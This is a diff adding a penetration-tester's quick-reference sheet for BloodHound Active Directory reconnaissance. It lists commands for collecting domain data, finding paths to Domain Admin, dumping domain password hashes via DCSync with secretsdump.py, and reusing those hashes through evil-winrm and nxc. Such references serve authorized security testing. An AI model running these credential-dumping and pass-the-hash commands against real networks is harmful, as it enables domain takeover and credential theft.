@@ -1,0 +1,31 @@
+BLOODHOUND — QUICK REF
+
+Requires: valid domain credentials, Docker running
+
+1.  Start BloodHound:
+    ./bloodhound-cli up
+    UI: http://127.0.0.1:8080  (admin / password from install)
+
+2.  Collect data:
+    bloodhound-ce-python --zip -c All -d <domain> -u <user> -p '<pass>' -dc <dc-host> -ns <dc-ip>
+
+3.  Ingest: Administration → File Ingest → Upload File(s) → select .zip
+
+4.  Explore:
+    - Pathfinding: source node → target → shortest path
+    - Mark as Owned (right-click) → path to DA
+    - HVT = diamond icon (DA, DC, krbtgt)
+
+5.  Key Cypher saved queries:
+    - Paths from Domain Users to Tier Zero / HVT
+    - Principals with DCSync privileges
+    - Computers where Domain Users are local admins
+    - Computers where Domain Users can read LAPS passwords
+
+6.  DCSync (if account has replication rights):
+    secretsdump.py <domain>/<user>:<pass>@<dc-ip>
+    secretsdump.py -hashes <lm>:<nt> <domain>/<user>@<dc-ip>
+
+7.  Use hashes:
+    evil-winrm -i <ip> -u Administrator -H <nt-hash>
+    nxc smb <ip> -u Administrator -H <nt-hash>
